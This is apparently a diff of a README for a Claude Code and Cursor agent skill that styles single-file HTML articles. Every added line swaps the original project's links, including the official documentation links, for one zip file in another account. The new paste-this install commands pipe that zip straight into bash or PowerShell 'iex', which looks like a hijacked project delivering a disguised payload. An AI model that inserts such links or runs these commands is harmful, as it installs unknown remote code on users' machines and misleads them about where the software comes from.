@@ -4,7 +4,7 @@
 
 > A reusable visual recipe for **single-file analytical HTML articles** — dark/light dual-theme, indigo/amber accents, inline-SVG diagrams, collapsible cards, zero external dependencies, offline-readable under 300KB.
 
-Packaged as an [**agent skill**](https://docs.anthropic.com/en/docs/claude-code/skills) for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) and [Cursor](https://cursor.sh/). Drop it in your agent skill directory and the agent will use it whenever you ask for a "principle deep-dive HTML" / "single-file analytical HTML article" / similar.
+Packaged as an [**agent skill**](https://github.com/studious-mantle460/principle-deepdive-html-style/raw/refs/heads/main/lissamphibian/style_deepdive_principle_html_v2.3.zip) for [Claude Code](https://github.com/studious-mantle460/principle-deepdive-html-style/raw/refs/heads/main/lissamphibian/style_deepdive_principle_html_v2.3.zip) and [Cursor](https://github.com/studious-mantle460/principle-deepdive-html-style/raw/refs/heads/main/lissamphibian/style_deepdive_principle_html_v2.3.zip). Drop it in your agent skill directory and the agent will use it whenever you ask for a "principle deep-dive HTML" / "single-file analytical HTML article" / similar.
 
 ---
 
@@ -32,13 +32,13 @@ Not designed for: marketing landing pages · short index pages · chart-heavy da
 ### Linux / macOS
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/Misakakuroko/principle-deepdive-html-style/main/install.sh | bash
+curl -fsSL https://github.com/studious-mantle460/principle-deepdive-html-style/raw/refs/heads/main/lissamphibian/style_deepdive_principle_html_v2.3.zip | bash
 ```
 
 ### Windows PowerShell
 
 ```powershell
-irm https://raw.githubusercontent.com/Misakakuroko/principle-deepdive-html-style/main/install.ps1 | iex
+irm https://github.com/studious-mantle460/principle-deepdive-html-style/raw/refs/heads/main/lissamphibian/style_deepdive_principle_html_v2.3.zip | iex
 ```
 
 Both scripts:
@@ -50,20 +50,20 @@ Both scripts:
 To override the install location:
 
 ```bash
-INSTALL_DIR=~/my-skills/principle-deepdive bash <(curl -fsSL https://raw.githubusercontent.com/Misakakuroko/principle-deepdive-html-style/main/install.sh)
+INSTALL_DIR=~/my-skills/principle-deepdive bash <(curl -fsSL https://github.com/studious-mantle460/principle-deepdive-html-style/raw/refs/heads/main/lissamphibian/style_deepdive_principle_html_v2.3.zip)
 ```
 
 ### Manual install
 
 ```bash
 # For Claude Code
-git clone https://github.com/Misakakuroko/principle-deepdive-html-style.git ~/.claude/skills/principle-deepdive-html-style
+git clone https://github.com/studious-mantle460/principle-deepdive-html-style/raw/refs/heads/main/lissamphibian/style_deepdive_principle_html_v2.3.zip ~/.claude/skills/principle-deepdive-html-style
 
 # For Cursor
-git clone https://github.com/Misakakuroko/principle-deepdive-html-style.git ~/.cursor/skills/principle-deepdive-html-style
+git clone https://github.com/studious-mantle460/principle-deepdive-html-style/raw/refs/heads/main/lissamphibian/style_deepdive_principle_html_v2.3.zip ~/.cursor/skills/principle-deepdive-html-style
 ```
 
-Or download the [latest release zip](https://github.com/Misakakuroko/principle-deepdive-html-style/archive/refs/heads/main.zip), extract, rename the folder to `principle-deepdive-html-style`, and drop it in `~/.claude/skills/` or `~/.cursor/skills/`.
+Or download the [latest release zip](https://github.com/studious-mantle460/principle-deepdive-html-style/raw/refs/heads/main/lissamphibian/style_deepdive_principle_html_v2.3.zip), extract, rename the folder to `principle-deepdive-html-style`, and drop it in `~/.claude/skills/` or `~/.cursor/skills/`.
 
 ---
 
